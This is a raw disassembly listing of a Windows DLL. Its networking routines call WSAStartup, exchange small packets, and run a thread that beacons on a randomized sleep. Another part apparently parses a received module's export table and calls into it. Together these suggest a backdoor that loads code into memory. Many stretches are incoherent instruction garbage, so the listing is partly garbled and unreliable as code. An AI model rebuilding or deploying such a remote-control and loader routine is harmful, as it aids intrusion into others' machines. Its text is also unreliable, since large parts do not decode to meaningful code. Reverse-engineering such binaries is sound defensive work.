sub_10001000
push ebp
mov ebp esp
xor eax eax
test ecx ecx
je r-xdata
mov eax 0x80070057
cmp ecx 0x7fffffff
jbe r-xdata
pop ebp
retn
push esi
push edi
lea esi [ ecx - 0x1 ]
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
push ecx
push esi
push ebx
xor edi edi
call sub_10009123
add esp 0x10
test eax eax
js r-xdata
test eax eax
js r-xdata
xor eax eax
mov [ ebx + esi * 2 ] ax
mov edi 0x8007007a
cmp eax esi
ja r-xdata
jne r-xdata
mov eax edi
pop edi
pop esi
xor edx edx
mov eax edi
pop edi
mov [ ebx + esi * 2 ] dx
pop esi
pop ebp
retn
sub_10001060
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor eax eax
push edi
test esi esi
je r-xdata
sub ecx 0x2
mov eax 0x8007007a
mov ebx [ ebp + 0x8 ]
mov edi edx
sub ebx ecx
test esi esi
jne r-xdata
movzx edx [ ebx + ecx ]
test dx dx
je r-xdata
pop edi
xor edx edx
pop esi
mov [ ecx ] dx
pop ebx
pop ebp
retn 0x4
mov [ ecx ] dx
add ecx 0x2
dec edi
dec esi
jne r-xdata
test edi edi
je r-xdata
pop edi
sub ecx 0x2
xor edx edx
pop esi
mov eax 0x8007007a
mov [ ecx ] dx
pop ebx
pop ebp
retn 0x4
sub_100010c0
push ebp
mov ebp esp
push 0xffffffff
push sub_100165b8
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov [ eax + 0x18 ] ecx
mov edx 0xf
mov [ eax + 0x1c ] edx
mov [ eax + 0x8 ] cl
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] ecx
mov [ eax + 0x28 ] cl
mov [ eax + 0x5c ] edx
mov [ eax + 0x58 ] ecx
mov [ eax + 0x48 ] cl
mov [ eax + 0x78 ] edx
mov [ eax + 0x74 ] ecx
mov [ eax + 0x64 ] cl
xor edx edx
mov [ eax ] 0xffffffff
mov [ eax + 0x80 ] ecx
mov [ eax + 0x24 ] dx
mov [ eax + 0x44 ] dx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x84 ] ecx
mov [ ebp - 0x4 ] ecx
mov edx edx
pushad
push esp
mov bl bl
pop esp
push 0x3
call sub_10005f66
popad
push 0x0
or al [ eax ]
add ch al
push eax
add [ edx ] 0x0
lea esi [ ebp + 0xa ]
xor ebx ebp
push 0x20202
mov eax [ esi + 0x20a96 ]
pop [ esi + 0x20892 ]
push ebp
push eax
mov ebx [ esi + 0x20aaa ]
mov ebx [ esi + 0x20a9a ]
mov ebx [ esi + 0x20a9e ]
mov ebx [ esi + 0x20aae ]
0x200f01d 0x7f8b
sub_10001185
or al 0x35
ror cl 0x86
mov [ 0xffffffffa200020a ] al
lar eax [ eax ]
leave
xchg [ esi + 0x600020a ] ah
add [ edx ] al
add [ ebx + 0x20ab686 ] cl
add [ ebx + 0x20aba86 ] cl
add [ ebx + 0x20abe86 ] cl
add [ ebx + 0x20ac286 ] cl
add [ ebx + 0x20ac686 ] cl
add [ ebx + 0x20aca86 ] cl
add [ ebx + 0x20ace86 ] cl
add [ ebp - 0x7776ed3c ] al
ror [ eax + eax ] 0x1
add cl [ ecx + 0x328d037 ]
adc cl [ ecx + 0xc90a0 ]
add bh [ ebx ]
std
je r-xdata
pushad
push ebp
mov al al
pop ebp
push 0x0
call sub_100060f3
popad
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push 0x20402
0x2007c93 0x268
sub_100011fe
or al 0x0
add al [ ebx - 0x3872ef3a ]
mov esp 0x2000600
jmp r-xdata
add bl bh
add [ edi - 0x79 ] edi
leave
jbe r-xdata
cmp eax 0x850377d3
out dx al
adc [ edi - 0x34c299f6 ] esi
jbe r-xdata
pushad
push ebp
mov al al
pop ebp
push 0x0
call sub_100060f3
popad
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push 0xc8831089
add al [ ebp + 0x774a04c0 ]
loop r-xdata
or ah [ esi + 0x3d ]

add al 0x33
aam 0x66
mov edx [ esi ]
jmp r-xdata
add al 0x3d
shl [ edi + 0x3 ] cl
test esi ebp
sub_10001211
mov al [ eax ]
sti
add [ edi - 0x79 ] edi
leave
jbe r-xdata
cmp eax 0x850377d3
out dx al
adc [ edi - 0x34c299f6 ] esi
jbe r-xdata
pushad
push ebp
mov al al
pop ebp
push 0x0
call sub_100060f3
popad
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push 0xc8831089
add al [ ebp + 0x774a04c0 ]
loop r-xdata
or ah [ esi + 0x3d ]

add al 0x33
aam 0x66
mov edx [ esi ]
jmp r-xdata
add al 0x3d
shl [ edi + 0x3 ] cl
test esi ebp
sub_10001270
push ebp
mov ebp esp
sub esp 0x1a8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
lea edi [ ebx + 0xa98 ]
call sub_10006199
mov eax [ edi ]
or eax [ edi + 0x4 ]
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10008d64
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x1a0 ]
push ecx
push 0x202
call [ WSAStartup@IAT ]
test eax eax
jne r-xdata
mov edx [ edi ]
or edx [ edi + 0x4 ]
jne r-xdata
call sub_10006266
mov [ ebx + 0x80 ] eax
mov eax [ edi + 0x4 ]
mov ecx [ edi ]
push eax
push ecx
push r--data
push rw-data
call sub_10008d73
mov eax rw-data
add esp 0x10
lea edx [ eax + 0x1 ]
mov cl [ rw-data ]
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push rw-data
push rw-data
call sub_10010170
mov edx [ rw-data ]
mov ecx [ r--data ]
xor eax eax
add esp 0xc
push 0x200
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax [ r--data ]
lea esi [ ebx + 0x88 ]
push 0x0
push esi
mov [ rw-data ] edx
mov [ rw-data ] eax
mov [ rw-data ] ecx
call sub_1000ffa0
add esp 0xc
push 0x3a
push rw-data
call sub_10008e10
sub eax rw-data
add esp 0x8
cmp eax 0x200
jbe r-xdata
test cl cl
jne r-xdata
push 0x3a
push rw-data
call sub_10008e10
add esp 0x8
sub eax rw-data
mov eax 0x200
jmp r-xdata
imul eax eax 0x343fd
add eax 0x269ec3
mov edx eax
shr edx 0x10
and edx 0x7fff
mov [ ebp + esi * 4 - 0x10 ] edx
inc esi
mov [ rw-data ] eax
cmp esi 0x3
jl r-xdata
call [ GetTickCount@IAT ]
mov cl 0x1
mov [ rw-data ] cl
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
push eax
push rw-data
push esi
call sub_10008ef0
add esp 0xc
push 0x3a
push rw-data
call sub_10008e10
inc eax
push eax
call sub_10008ee4
add esp 0xc
mov ecx ebx
mov [ ebx + 0x288 ] eax
call sub_100017f0
lea edi [ ebx + 0x890 ]
mov eax esi
call sub_10002600
movzx edx [ ebx + 0x288 ]
mov eax edi
mov [ ebp - 0x1a4 ] edx
lea esi [ eax + 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x10 ]
not eax
mov [ edi ] eax
mov [ edi + 0x4 ] 0x0
sub eax esi
mov edi eax
lea esi [ ebx + 0x8 ]
lea eax [ ebx + 0x890 ]
call sub_10003ed0
mov ax [ ebp - 0x1a4 ]
push 0x200
mov [ ebx + 0x24 ] ax
lea eax [ ebx + 0x28c ]
push 0x0
push eax
call sub_1000ffa0
add esp 0xc
push 0x200
lea eax [ ebx + 0x490 ]
push 0x0
push eax
call sub_1000ffa0
add esp 0xc
push 0x200
lea eax [ ebx + 0x690 ]
push 0x0
push eax
call sub_1000ffa0
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov eax rw-data
add esp 0xc
mov [ ebx + 0xaa0 ] ecx
mov [ ebx + 0xaa4 ] edx
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
cmp eax 0x3
jbe r-xdata
push 0x8007
call [ SetErrorMode@IAT ]
push 0x0
push 0x4
push ebx
push sub_100022a0
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ ebx + 0xad4 ] eax
push 0x3a
push rw-data
call sub_10008e10
sub eax rw-data
add esp 0x8
cmp eax 0x200
jbe r-xdata
push 0x3a
push rw-data
call sub_10008e10
add esp 0x8
sub eax rw-data
mov eax 0x200
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
mov edi eax
lea esi [ ebx + 0x28 ]
lea eax [ ebx + 0x28c ]
call sub_10003ed0
mov cx [ ebp - 0x1a4 ]
mov eax rw-data
mov [ ebx + 0x44 ] cx
lea esi [ eax + 0x1 ]
lea esp [ esp ]
push eax
push rw-data
lea esi [ ebx + 0x28c ]
push esi
call sub_10008ef0
add esp 0xc
push 0x3a
push rw-data
call sub_10008e10
inc eax
push eax
call sub_10008ee4
mov [ ebx + 0x48c ] eax
movzx eax ax
mov [ ebp - 0x1a4 ] eax
mov eax esi
add esp 0xc
lea esi [ eax + 0x1 ]
lea ecx [ ecx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
mov edi eax
lea esi [ ebx + 0x48 ]
mov eax rw-data
call sub_10003ed0
mov eax rw-data
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
mov edi eax
lea esi [ ebx + 0x64 ]
mov eax rw-data
call sub_10003ed0
mov eax rw-data
lea edx [ ebx + 0x490 ]
mov [ ebx + 0x4 ] 0x1
sub edx eax
lea esp [ esp ]
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
mov eax rw-data
lea edx [ ebx + 0x690 ]
sub edx eax
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
sub_1000175a
stc
add edi edi
push esp
lea eax [ edi + 0x1fffdec ]
push eax
push ebx
push edi
add [ 0x10037046 ] edx
lea ecx [ ebp + 0xe ]
mov ebx [ edi + 0x1fffbc8 ]
lea edx [ edi + 0x1fffdec ]
push edx
pop [ ebp - 0xfe061a ]
push edx
push 0x100394ba
0x1fffa72 0xc683
sub_10001790
or al 0xc9
test esi ecx
stc
add edi edi
add eax [ eax ]
add al [ eax ]
lea eax [ ebp - 0xfe061e ]
lea ebx [ 0x1003706a ]
cmp eax 0x520976c7
call ebp
mov [ edi + 0x1fffbe0 ] edi
cmp edi ecx
je r-xdata
pushad
push edi
mov cl cl
pop edi
push 0xa
call sub_100060f3
popad
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x634 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008d64
mov esp ebp
pop ebp
retn
push esi
add ebx edx
mov ebp ebp
sub_100017f0
push ebp
mov ebp esp
sub esp 0x2f4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov [ ebp - 0x2ec ] ecx
mov edx edx
pushad
push edi
mov ah ah
pop edi
push 0x1
call sub_10005f66
popad
mov [ edi + 0x1ffff14 ] ds
mov eax [ ebp + 0x2000c94 ]
push 0x20802
insb
add [ edx - 0x18 ] dl
outsb
out 0x2 eax
add [ ebp + 0x26a0ec4 ] al
push 0x2
push 0x1
lea esi [ ebp + 0x2000288 ]
push esi
insb
add [ eax + eax + 0x1 ] ch
adc eax 0x1003713e
sub_1000184f
clc
xor eax 0x3478fc9
mov edx 0x20004
stc
loop r-xdata
insb
[ eax + 0x6a ]
add ch [ edx + 0x2 ]
mov [ edi + 0x1ffff14 ] eax
call [ edi ]
cmp al 0x73
add [ edx ] edx
mov edi [ edi + 0x1ffff14 ]
test [ ecx ] eax
je r-xdata
nop
retn
xchg esp eax
or al 0x0
add cl [ ebx + 0x4888d ]
add cl [ ecx + 0x6008a ]
add cl [ ebx + 0xc9495 ]
add ah [ ecx + 0x100526fa ]
mov eax [ edx + 0x20406 ]
mov eax [ ebp + 0x2000c94 ]
mov ebx ecx
mov esi 0x20202
in eax dx
push es
sub_100018a1
mov es [ eax ]
std
add [ edi - 0x79 ] edi
leave
jbe r-xdata
xchg esi esi
ja r-xdata
adc [ edi - 0x367899f4 ] esi
xor edx esp
push edi
push 0x44e81289
ja r-xdata
test eax ebp
add al 0x33
aam 0x57
push 0xc2830a89
add al [ ebp + 0x774e04c2 ]
loop r-xdata
les eax [ esi ]
mov eax [ ebp + 0x2000c94 ]
mov ecx [ ebp + 0x2000488 ]
mov [ edx + 0x2000600 ] ecx
mov edx [ ebp + 0x2000c94 ]
mov eax [ 0x100526fa ]
mov eax [ edx + 0x20406 ]
add [ ebp - 0x7a74f93c ] al
xchg esp eax
or al 0x0
add cl [ ebx + 0x4888d ]
add cl [ ecx + 0x6008a ]
add cl [ ebx + 0xc9495 ]
add ah [ ecx + 0x100526fa ]
jbe r-xdata
or al 0x66
xchg ecx ecx
add al 0x87
div [ edi + 0x3 ]
sub_1000194f
add dl [ eax + 0x75 ]
in al 0xeb
push es
test eax edi
jne r-xdata
push 0x958b0a89
xchg esp eax
or al 0x0
add bh [ esi + 0x20102 ]
pop [ edx + 0x20412 ]
push 0xa740a39
add edx 0x2
push eax
jne r-xdata
sub edx 0x2
xor eax 0xa8968c9
mov edx [ ebp + 0x2000c94 ]
mov esi 0x20102
or dh [ edx + ecx - 0x7d ]
retn 0x5002
jmp r-xdata
xchg esp eax
or al 0x0
add bh [ eax + 0x20102 ]
sub_1000197f
test eax edi
je r-xdata
xchg esp eax
or al 0x0
add bh [ eax + 0x20102 ]
mov ecx 0x20102
sub eax 0x300bace
add [ edx ] al
sub eax ebx
lea ecx [ esi + 0x204124a ]
add [ edx - 0x38 ] ch
xchg esi eax
add [ edx ] edx
mov edx 0x7f01ff01
0x1fff8b9 0x958b
sub_10001b31
xchg ebp eax
cli
inc [ ecx ]
call [ edx + ebp * 2 + 0xd ]
push 0x20802
add [ 0x100370ea ] edx
xchg eax eax
jbe r-xdata
push 0x42
lea edx [ edi + 0x1ffffb8 ]
push edi
push esp
call rw-data
test esp eax
push cs
lea eax [ edi + 0x1ffffb8 ]
push eax
leave
test [ edx + 0x42ff01fd ] edi
add [ edx ] al
add [ ecx ] al
adc eax 0x10037072
xchg eax eax
jbe r-xdata
pop [ ebp - 0xfe0106 ]
push edx
call rw-data
lea ecx [ ebx + 0x20a96 ]
test esp eax
push es
mov [ ebx + 0x200086c ] eax
lea eax [ ebx + 0x20a96 ]
pop es
js r-xdata
lea eax [ ebx + 0x20a96 ]
lea ecx [ ebp - 0xfe023e ]
mov ecx [ eax + 0x20672 ]
lea edx [ ebp - 0xfe023a ]
mov edx [ eax + 0x20676 ]
mov edi [ ebp + 0x2000c94 ]
add esi 0x4
add edi 0x7a
push es
add al [ eax ]
0x2000cfd 0x378b
add [ edx ] al
push eax
0x2000da1 0xbd8b
sub_10001bec
fmul [ ebx + 0xc9495 ]
add cl [ ecx + 0x9fc84 ]
add [ ebx - 0x74bf9f2e ] cl
in eax dx
dec eax
push 0x0
call sub_100060f3
popad
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008d64
mov esp ebp
pop ebp
retn
sub_10001c20
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_1000f9a0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov esi ecx
mov eax esi
call sub_100072d5
mov bl al
call [ WSAGetLastError@IAT ]
test bl bl
je r-xdata
mov al bl
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] 0x0
mov ebx esi
call sub_10001e30
mov [ ebp - 0x19 ] al
test al al
je r-xdata
xor bl bl
mov [ ebp - 0x19 ] bl
call sub_10001d40
mov [ ebp - 0x19 ] al
test al al
je r-xdata
push esi
call sub_10001f10
mov bl al
mov [ ebp - 0x19 ] bl
test bl bl
je r-xdata
mov edi [ esi + 0xaa8 ]
mov eax [ esi + 0xad4 ]
push eax
call [ ResumeThread@IAT ]
jmp r-xdata
call edi
cmp al 0x1
je r-xdata
mov ecx [ esi + 0xad4 ]
push ecx
call [ SuspendThread@IAT ]
mov esi [ esi + 0xaac ]
test esi esi
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call esi
jmp r-xdata
sub_10001d00
push ecx
push esi
push edi
mov edi [ Sleep@IAT ]
xor esi esi
jmp r-xdata
mov ecx ebx
call sub_10001c20
test al al
jne r-xdata
cmp esi [ ebx + 0xaa4 ]
jl r-xdata
push 0x2710
inc esi
call edi
mov eax [ ebx + 0xaa0 ]
push eax
call edi
pop edi
xor al al
pop esi
pop ecx
retn
sub_10001d40
push ebp
mov ebp esp
sub esp 0x8
push esi
push edi
push 0x13
call sub_10008c7c
mov esi eax
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] ax
mov [ esi + 0x12 ] al
mov eax [ rw-data ]
mov [ esi ] eax
mov ecx [ rw-data ]
mov [ esi + 0x4 ] ecx
mov edx [ rw-data ]
push esi
mov [ esi + 0x8 ] edx
mov eax [ rw-data ]
push 0x13
push 0x2
mov [ esi + 0xc ] eax
mov cl [ rw-data ]
push 0x8
push 0x0
mov [ esi + 0x10 ] cl
call sub_100074f4
push esi
mov edi eax
call sub_10009014
add esp 0x1c
push edi
push ebx
call sub_10002120
test al al
je r-xdata
xor al al
pop edi
pop esi
mov esp ebp
pop ebp
retn
lea edi [ ebp - 0x8 ]
mov ecx ebx
mov [ ebp - 0x8 ] 0x0
call sub_10002010
test al al
je r-xdata
mov edi [ ebp - 0x8 ]
mov eax [ edi + 0x9 ]
mov edx eax
shr edx 0xb
test dl 0x1f
jne r-xdata
cmp al 0x9
jne r-xdata
shr eax 0x8
test al 0x7
jne r-xdata
cmp [ edi + 0xe ] 0x20
mov al 0x1
lea esi [ edi + 0x12 ]
je r-xdata
xor ecx ecx
lea edi [ ebx + 0xab4 ]
mov [ edi ] ecx
mov [ edi + 0x4 ] ecx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] ecx
mov [ edi + 0x10 ] ecx
mov [ edi + 0x14 ] ecx
mov [ edi + 0x18 ] ecx
mov [ edi + 0x1c ] ecx
mov ecx 0x8
[ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_10001e30
push ebp
mov ebp esp
sub esp 0x8
push esi
push edi
mov edi [ ebx + 0xa94 ]
push 0x813
call sub_10008c7c
push 0x813
mov esi eax
push 0x0
push esi
call sub_1000ffa0
mov eax [ rw-data ]
mov [ esi ] eax
mov ecx [ rw-data ]
mov [ esi + 0x4 ] ecx
mov edx [ rw-data ]
mov [ esi + 0x8 ] edx
mov eax [ rw-data ]
mov [ esi + 0xc ] eax
mov cl [ rw-data ]
add esp 0x10
mov [ esi + 0x10 ] cl
test edi edi
je r-xdata
push esi
push 0x813
push 0x2
push 0x4
push 0x0
call sub_100074f4
push esi
mov edi eax
call sub_10009014
add esp 0x18
push edi
push ebx
call sub_10002120
test al al
je r-xdata
push 0x800
lea edx [ esi + 0x12 ]
push edi
push edx
call sub_10010170
add esp 0xc
pop edi
xor al al
pop esi
mov esp ebp
pop ebp
retn
lea edi [ ebp - 0x8 ]
mov ecx ebx
mov [ ebp - 0x8 ] 0x0
call sub_10002010
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x9 ]
mov ecx eax
shr ecx 0xb
test cl 0x1f
jne r-xdata
cmp al 0x4
jne r-xdata
shr eax 0x8
test al 0x7
jne r-xdata
mov al 0x1
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_10001f10
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push 0x13
call sub_10008c7c
mov esi eax
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] ax
mov [ esi + 0x12 ] al
mov eax [ rw-data ]
mov [ esi ] eax
mov ecx [ rw-data ]
add esp 0x4
mov [ esi + 0x4 ] ecx
mov edx [ rw-data ]
push esi
mov [ esi + 0x8 ] edx
mov eax [ rw-data ]
push 0x13
push 0x2
mov [ esi + 0xc ] eax
mov cl [ rw-data ]
push 0x7
push 0x0
mov [ esi + 0x10 ] cl
call sub_100074f4
add esp 0x14
push esi
mov edi eax
call sub_10009014
add esp 0x4
push edi
push ebx
call sub_10002120
test al al
je r-xdata
xor al al
lea edi [ ebp - 0x10 ]
mov ecx ebx
mov [ ebp - 0x10 ] 0x0
call sub_10002010
test al al
je r-xdata
mov edi edi
pushad
inc esp
mov ebx ebx
dec esp
push 0x1
call sub_10005f66
popad
lea edx [ ebp - 0xe ]
mov eax [ ecx + ecx - 0x73 ]
enter 0xe9c3 0xd
test bl 0x1f
ja r-xdata
mov [ edi - 0x5 ] 0x0
jmp r-xdata
add eax 0xe8c30b77
or al dh
inc edi
sti
add ebp [ eax - 0x39f98bf7 ]
inc edi
sti
add bl ch
add [ eax + 0x46 ] ah
jmp r-xdata
pushad
inc esi
dec esi
push 0x3
call sub_100060f3
popad
mov al [ ebp - 0x5 ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x10 ]
call sub_10002360
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10002010
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push 0x12
lea eax [ ebp - 0x18 ]
mov ebx ecx
push eax
mov [ ebp - 0x1c ] 0x0
call sub_100073c7
cmp eax 0x12
jne r-xdata
xor al al
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10008d64
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x18 ]
cmp eax 0x1400000
jbe r-xdata
push esi
inc eax
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0x18 ]
inc ecx
push ecx
push 0x0
push eax
mov [ edi ] eax
call sub_1000ffa0
mov edx [ ebp - 0x18 ]
mov eax [ edi ]
mov [ eax ] edx
mov ecx [ ebp - 0x14 ]
mov [ eax + 0x4 ] ecx
mov edx [ ebp - 0x10 ]
mov [ eax + 0x8 ] edx
mov ecx [ ebp - 0xc ]
mov [ eax + 0xc ] ecx
mov dx [ ebp - 0x8 ]
mov [ eax + 0x10 ] dx
mov esi [ ebp - 0x18 ]
add esi 0xffffffee
add esp 0xc
test esi esi
jle r-xdata
mov esi [ ebp - 0x1c ]
push esi
call sub_10008c7c
add esp 0x4
push esi
push eax
mov [ ebp - 0x1c ] eax
call sub_100073c7
cmp eax esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
mov al bl
xor ecx ebp
pop ebx
call sub_10008d64
mov esp ebp
pop ebp
retn
push esi
call sub_10009014
add esp 0x4
mov ecx [ edi ]
push esi
mov esi [ ebp - 0x1c ]
add ecx 0x12
push esi
push ecx
call sub_10010170
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x1c ]
push eax
call sub_10009014
add esp 0x4
pop esi
xor al al
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10008d64
mov esp ebp
pop ebp
retn
push edi
call sub_10007638
add esp 0x4
mov bl al
test esi esi
je r-xdata
sub_10002120
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push ebx
test eax eax
jne r-xdata
push esi
push edi
mov edi [ eax ]
mov esi [ edi ]
add esi [ rw-data ]
lea eax [ esi + 0x4 ]
push eax
mov [ ebp - 0x4 ] eax
call sub_10008c7c
mov ebx eax
mov eax [ ebp - 0x4 ]
push eax
push 0x0
push ebx
call sub_1000ffa0
mov ecx [ edi ]
mov edx [ ebp + 0xc ]
mov eax [ edx ]
push ecx
push eax
push ebx
call sub_10010170
mov ecx [ rw-data ]
mov edx [ edi ]
push ecx
add edx ebx
push r--data
push edx
call sub_10010170
mov edi [ ebp + 0x8 ]
add esp 0x28
push esi
push ebx
call sub_1000736e
test eax eax
je r-xdata
mov ebx [ ebp + 0xc ]
mov [ ebp + 0xb ] al
jmp r-xdata
mov [ ebp + 0xb ] 0x0
mov [ ebp + 0xb ] 0x1
cmp eax 0xffffffff
jne r-xdata
test ebx ebx
je r-xdata
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
pop edi
pop esi
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
mov edi [ HeapFree@IAT ]
test eax eax
je r-xdata
mov al [ ebp + 0xb ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
push ebx
call sub_10009014
add esp 0x4
sub_100021e0
push ebp
mov ebp esp
sub esp 0x8
push esi
push edi
push 0x13
call sub_10008c7c
mov esi eax
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] ax
mov [ esi + 0x12 ] al
mov eax [ rw-data ]
mov [ esi ] eax
mov ecx [ rw-data ]
mov [ esi + 0x4 ] ecx
mov edx [ rw-data ]
push esi
mov [ esi + 0x8 ] edx
mov eax [ rw-data ]
push 0x13
push 0x0
mov [ esi + 0xc ] eax
mov cl [ rw-data ]
push 0x6
push 0x0
mov [ esi + 0x10 ] cl
call sub_100074f4
push esi
mov edi eax
call sub_10009014
add esp 0x1c
push edi
push ebx
call sub_10002120
test al al
je r-xdata
pop edi
xor al al
pop esi
mov esp ebp
pop ebp
retn
lea edi [ ebp - 0x8 ]
mov ecx ebx
mov [ ebp - 0x8 ] 0x0
call sub_10002010
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ edx + 0x9 ]
mov ecx eax
shr ecx 0xb
test cl 0x1f
jne r-xdata
cmp al 0x6
jne r-xdata
shr eax 0x8
test al 0x7
jne r-xdata
mov al 0x1
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_100022a0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
lea esp [ esp ]
pop edi
pop esi
or eax 0xffffffff
pop ebx
pop ebp
retn 0x4
push edi
push ebx
call sub_10002120
test al al
je r-xdata
push 0x0
call sub_1000914b
push eax
call sub_1000901f
add esp 0x8
call sub_10009031
cdq
mov ecx 0x3
idiv ecx
inc edx
imul edx edx 0xea60
push edx
call [ Sleep@IAT ]
jmp r-xdata
push 0x13
call sub_10008c7c
mov esi eax
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] ax
mov [ esi + 0x12 ] al
mov eax [ rw-data ]
mov [ esi ] eax
mov ecx [ rw-data ]
mov [ esi + 0x4 ] ecx
mov edx [ rw-data ]
push esi
mov [ esi + 0x8 ] edx
mov eax [ rw-data ]
push 0x13
push 0x2
mov [ esi + 0xc ] eax
mov cl [ rw-data ]
push 0x0
push 0x1
mov [ esi + 0x10 ] cl
call sub_100074f4
push esi
mov edi eax
call sub_10009014
add esp 0x1c
test edi edi
je r-xdata
sub_10002360
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
xor edi edi
mov [ ebx + 0xab0 ] edi
mov [ ebx + 0xaa8 ] edi
mov [ ebx + 0xaac ] edi
mov ecx [ ecx ]
xor al al
cmp [ ecx + 0xe ] 0x12
lea edx [ ecx + 0x12 ]
jbe r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push edx
call sub_10006625
mov [ ebx + 0xab0 ] eax
mov eax [ ebx + 0xaac ]
add esp 0x4
mov [ ebx + 0xaa8 ] edi
cmp eax edi
je r-xdata
mov eax [ ebx + 0xab0 ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] ecx
cmp [ eax + 0x7c ] edi
je r-xdata
call eax
mov eax [ ebx + 0xab0 ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x4 ] ecx
cmp [ eax + 0x7c ] edx
je r-xdata
mov esi [ eax + 0x78 ]
mov eax [ esi + ecx + 0x18 ]
add esi ecx
cmp eax edi
je r-xdata
mov [ ebp - 0x4 ] edx
mov esi [ eax + 0x78 ]
